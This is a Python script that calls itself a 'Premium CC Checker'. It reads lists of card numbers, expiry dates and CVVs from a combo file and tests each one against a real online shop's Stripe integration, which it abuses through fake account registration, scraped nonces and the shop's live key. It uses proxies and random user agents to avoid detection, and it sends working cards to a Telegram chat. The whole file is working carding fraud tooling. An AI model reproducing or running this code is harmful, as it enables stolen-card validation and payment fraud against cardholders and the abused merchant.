import aiohttp
import asyncio
import re
import random
import string
from colorama import Fore, Style, init
import user_agent
import json
import os
from datetime import datetime

# Initialize colorama
init(autoreset=True)

# Banner with improved styling
BANNER = f"""
{Fore.CYAN + Style.BRIGHT}
██████╗ ██████╗  ██████╗ ██████╗  █████╗  ██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔════╝ ██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝██████╔╝██║   ██║██████╔╝███████║██║  ███╗███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██╗██║   ██║██╔═══╝ ██╔══██║██║   ██║██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║╚██████╔╝██║     ██║  ██║╚██████╔╝██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
{Fore.YELLOW + Style.BRIGHT}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 Premium CC Checker 🔥
🛠️ Coded by: @FNxELECTRA
🎯 Version: 1.5 Ultimate
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.RESET}
"""

# Clear console and display banner
def clear_and_show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

# Generate random email
def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

# Fetch nonce from a URL
async def fetch_nonce(session, url, regex_pattern, proxy=None):
    try:
        async with session.get(url, proxy=proxy) as response:
            html = await response.text()
            nonce_match = re.search(regex_pattern, html)
            if nonce_match:
                return nonce_match.group(1)
            return None
    except Exception as e:
        print(f"{Fore.RED}Nonce fetch error: {e}")
        return None

# Send formatted message to Telegram bot
async def send_to_telegram(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data) as response:
                result = await response.json()
                if result.get("ok"):
                    print(f"{Fore.GREEN}✅ Telegram notification sent successfully!")
                else:
                    print(f"{Fore.RED}❌ Failed to send Telegram notification: {result}")
                return result
    except Exception as e:
        print(f"{Fore.RED}Telegram send error: {e}")
        return None

# Format Approved CC Message for Telegram with improved styling
def format_telegram_message(ccx):
    try:
        card_number, exp_month, exp_year, cvv = ccx.split("|")
        return f"""
<b>💳 CARD APPROVED 💳</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{card_number}</code>
📆 <b>Expiry:</b> <code>{exp_month}/{exp_year}</code>
🔐 <b>CVV:</b> <code>{cvv}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💸 <b>Stripe Charge:</b> ✅ $0.20
💵 <b>Square Charge:</b> ✅ $0.20
🔗 <b>Status:</b> <code>Charged Successfully</code>
⏰ <b>Time:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
👨‍💻 <b>Dev:</b> @FNxELECTEA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚀 <b>Premium Checker v1.5</b>
"""
    except ValueError:
        return f"<b>⚠️ Invalid Combo Format:</b> <code>{ccx}</code>"

# Process each line with credit card information
async def process_line(line, semaphore, token, chat_id, proxy=None):
    async with semaphore:
        await asyncio.sleep(random.uniform(1, 3))  # Random delay between 1 and 3 seconds
        ccx = line.strip().split('\n')[0]
        
        # Format the card info for display
        card_display = f"{Fore.CYAN + Style.BRIGHT}[{ccx}]{Fore.RESET}"
        
        try:
            n, mm, yy, cvc = ccx.split("|")
        except ValueError:
            print(f"{card_display} >> {Fore.RED + Style.BRIGHT}Invalid combo format ❌")
            return

        if "20" in yy:  # Handle year format
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        email = generate_random_account()

        headers = {
            "User-Agent": user,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Referer": "https://www.dragonworksperformance.com/my-account",
        }

        connector = aiohttp.TCPConnector(ssl=False, limit=100)
        async with aiohttp.ClientSession(headers=headers, connector=connector, trust_env=True) as session:
            try:
                print(f"{card_display} >> {Fore.YELLOW}Processing...")
                
                # Fetch registration nonce
                nonce = await fetch_nonce(session, 'https://www.dragonworksperformance.com/my-account', r'name="woocommerce-register-nonce" value="(.*?)"', proxy=proxy)
                if not nonce:
                    print(f"{card_display} >> {Fore.RED + Style.BRIGHT}Failed to extract nonce ❌")
                    return

                # Register account
                data = {
                    "email": email,
                    "wc_order_attribution_source_type": "typein",
                    "wc_order_attribution_referrer": "(none)",
                    "wc_order_attribution_utm_campaign": "(none)",
                    "wc_order_attribution_utm_source": "(direct)",
                    "wc_order_attribution_utm_medium": "(none)",
                    "wc_order_attribution_utm_content": "(none)",
                    "wc_order_attribution_utm_id": "(none)",
                    "wc_order_attribution_utm_term": "(none)",
                    "wc_order_attribution_utm_source_platform": "(none)",
                    "wc_order_attribution_utm_creative_format": "(none)",
                    "wc_order_attribution_utm_marketing_tactic": "(none)",
                    "wc_order_attribution_session_entry": "https://www.dragonworksperformance.com/my-account/",
                    "wc_order_attribution_session_start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "wc_order_attribution_session_pages": "7",
                    "wc_order_attribution_session_count": "1",
                    "wc_order_attribution_user_agent": user,
                    "woocommerce-register-nonce": nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register"
                }
                
                print(f"{card_display} >> {Fore.YELLOW}Registering account...")
                async with session.post('https://www.dragonworksperformance.com/my-account', data=data, proxy=proxy) as response:
                    if response.status != 200:
                        print(f"{card_display} >> {Fore.RED + Style.BRIGHT}Registration failed ❌")
                        return

                # Fetch payment method nonce
                print(f"{card_display} >> {Fore.YELLOW}Fetching payment nonce...")
                payment_nonce = await fetch_nonce(session, 'https://www.dragonworksperformance.com/my-account/add-payment-method/', r'"createAndConfirmSetupIntentNonce":"(.*?)"', proxy=proxy)
                if not payment_nonce:
                    print(f"{card_display} >> {Fore.RED + Style.BRIGHT}Failed to extract payment nonce ❌")
                    return

                # Create Stripe payment method
                print(f"{card_display} >> {Fore.YELLOW}Creating Stripe payment method...")
                stripe_headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': user,
                }
                stripe_data = {
                    "type": "card",
                    "card[number]": n,
                    "card[cvc]": cvc,
                    "card[exp_year]": yy,
                    "card[exp_month]": mm,
                    "allow_redisplay": "unspecified",
                    "billing_details[address][postal_code]": "10009",
                    "billing_details[address][country]": "US",
                    "payment_user_agent": "stripe.js/7802eaa3b7; stripe-js-v3/7802eaa3b7; payment-element; deferred-intent",
                    "referrer": "https://www.dragonworksperformance.com",
                    "client_attribution_metadata[client_session_id]": "008d9c5c-83e3-4e41-8d7f-c96e42ef0791",
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                    "client_attribution_metadata[merchant_integration_version]": "2021",
                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                    "guid": "NA",
                    "muid": "09df86b6-e72c-4042-9863-c72c0927d7f8238c89",
                    "sid": "356eca4b-e47c-4b33-a3b7-588cc78fb27d179288",
                    "key": "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN",
                    "_stripe_version": "2024-06-20",
                }
                
                async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy) as stripe_response:
                    stripe_json = await stripe_response.json()
                    if 'id' not in stripe_json:
                        print(f"{card_display} >> {Fore.RED + Style.BRIGHT}ERROR CARD ❌{Fore.RESET}")
                        print(f"  {Fore.RED}Response: {json.dumps(stripe_json, indent=2)}")
                        print(f"  {Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                        return

                    payment_method_id = stripe_json['id']

                # Add payment method to account
                print(f"{card_display} >> {Fore.YELLOW}Adding payment method...")
                headers = {
                    "Host": "www.dragonworksperformance.com",
                    "content-length": "142",
                    "sec-ch-ua-platform": '"Android"',
                    "x-requested-with": "XMLHttpRequest",
                    "user-agent": user,
                    "accept": "*/*",
                    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132"',
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://www.dragonworksperformance.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.dragonworksperformance.com/my-account/add-payment-method/",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                    "priority": "u=1, i"
                }
                data = {
                    "action": "create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": payment_method_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": payment_nonce,
                }
                
                async with session.post('https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers, data=data, proxy=proxy) as response:
                    response_json = await response.json()
                    
                    # Check if the payment was successful
                    if response_json.get("success", False) and response_json.get("data", {}).get("status", "") == "succeeded":
                        # Create a highlighted box for approved cards
                        print(f"""
{Fore.GREEN + Style.BRIGHT}╔{'═' * 60}╗
║ {Fore.WHITE + Style.BRIGHT}💳 APPROVED: {ccx}{' ' * (47 - len(ccx))} {Fore.GREEN + Style.BRIGHT}║
╚{'═' * 60}╝{Fore.RESET}""")
                        
                        # Send to Telegram
                        message = format_telegram_message(ccx)
                        await send_to_telegram(token, chat_id, message)
                    else:
                        print(f"{card_display} >> {Fore.RED + Style.BRIGHT}DECLINED ❌")
                        print(f"  {Fore.RED}Response: {json.dumps(response_json, indent=2)}")
                    
                    print(f"  {Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            except Exception as e:
                print(f"{card_display} >> {Fore.RED + Style.BRIGHT}Error: {str(e)} ❌")
                print(f"  {Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

# Main function to run the script
async def main():
    global token, ID  # Make these global so they can be accessed in process_line
    
    clear_and_show_banner()
    
    print(f"{Fore.CYAN + Style.BRIGHT}[INFO] {Fore.YELLOW}Starting Premium CC Checker...")
    
    # User input with improved formatting
    print(f"{Fore.CYAN + Style.BRIGHT}┌─ {Fore.YELLOW}Configuration{Fore.CYAN + Style.BRIGHT} ───────────────────────────────────────┐")
    combo = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}📂 Enter Combo File Name: {Fore.RESET}")
    token = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}🤖 Enter Telegram Bot Token: {Fore.RESET}")
    chat_id = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}💬 Enter Telegram Chat ID: {Fore.RESET}")
    use_proxy = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}🛡️ Use Proxy? (Y/N): {Fore.RESET}").strip().lower()
    print(f"{Fore.CYAN + Style.BRIGHT}└───────────────────────────────────────────────────────┘")

    proxy = None
    if use_proxy == 'y':
        print(f"{Fore.CYAN + Style.BRIGHT}┌─ {Fore.YELLOW}Proxy Configuration{Fore.CYAN + Style.BRIGHT} ────────────────────────────────┐")
        proxy_host = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}🌐 Enter Proxy Host: {Fore.RESET}")
        proxy_port = input(f"{Fore.CYAN + Style.BRIGHT}│ {Fore.YELLOW}🔢 Enter Proxy Port: {Fore.RESET}")
        proxy = f"http://{proxy_host}:{proxy_port}"
        print(f"{Fore.CYAN + Style.BRIGHT}└───────────────────────────────────────────────────────┘")

    # Test Telegram connection
    print(f"\n{Fore.YELLOW}Testing Telegram connection...")
    test_result = await send_to_telegram(token, chat_id, "<b>🚀 CC Checker started!</b>\nReady to process cards...")
    
    if not test_result or not test_result.get("ok"):
        print(f"{Fore.RED + Style.BRIGHT}[ERROR] Telegram connection failed. Please check your bot token and chat ID.")
        retry = input(f"{Fore.YELLOW}Continue anyway? (Y/N): {Fore.RESET}").strip().lower()
        if retry != 'y':
            return

    # Open combo file
    try:
        with open(combo, "r") as file:
            lines = file.readlines()
            total_cards = len(lines)
            
        print(f"\n{Fore.GREEN + Style.BRIGHT}[SUCCESS] {Fore.YELLOW}Loaded {Fore.WHITE + Style.BRIGHT}{total_cards}{Fore.YELLOW} cards from {combo}")
        print(f"{Fore.YELLOW}Starting processing with {10} concurrent workers...\n")
        print(f"{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        # Create a semaphore to limit concurrent connections
        semaphore = asyncio.Semaphore(10)  # Adjust as needed for performance
        
        # Process all cards
        tasks = [process_line(line, semaphore, token, chat_id, proxy) for line in lines]
        await asyncio.gather(*tasks)
        
        print(f"\n{Fore.GREEN + Style.BRIGHT}[COMPLETE] {Fore.YELLOW}Finished processing all cards!")
        
    except FileNotFoundError:
        print(f"{Fore.RED + Style.BRIGHT}[ERROR] {Fore.YELLOW}File '{combo}' not found. Exiting.")
        return

# Run script
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW + Style.BRIGHT}Script terminated by user. Exiting...")
    except Exception as e:
        print(f"\n{Fore.RED + Style.BRIGHT}[FATAL ERROR] {str(e)}")
